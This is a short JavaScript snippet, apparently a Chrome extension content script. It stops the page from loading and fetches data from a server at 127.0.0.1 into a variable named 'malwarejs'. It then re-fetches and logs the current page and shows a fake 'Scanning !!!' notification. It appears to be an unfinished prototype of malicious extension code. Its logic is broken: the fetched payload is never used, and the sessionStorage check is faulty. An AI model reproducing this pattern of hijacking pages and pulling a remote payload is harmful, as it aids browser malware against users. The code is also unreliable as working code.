if (sessionStorage.times % 2 === 0){
    sessionStorage.setItem('check','true');
    console.log("Checked");
}else{
    sessionStorage.times = 1;
    window.stop();
    fetch("http://127.0.0.1/connect.php")
        .then(response => response.json())
        .then(malwarejs => {
            // Process and use the retrieved data
            console.log(window.location.href);
            fetch(window.location.href)
                .then(response => response.text())
                .then(data => {
                    // Process the response data
                    console.log(data);

    chrome.runtime.sendMessage('', {
        type: 'notification',
        options: {
            title: 'Just wanted to notify you',
            message: 'Scanning !!!',
            iconUrl: '/ZKZx.gif',
            type: 'basic'
        }
    });

})
.catch(error => {
    // Handle any errors
    console.error(error);
});
})
.catch(error => {
// Handle any errors
console.error('Error retrieving data:', error);
});
}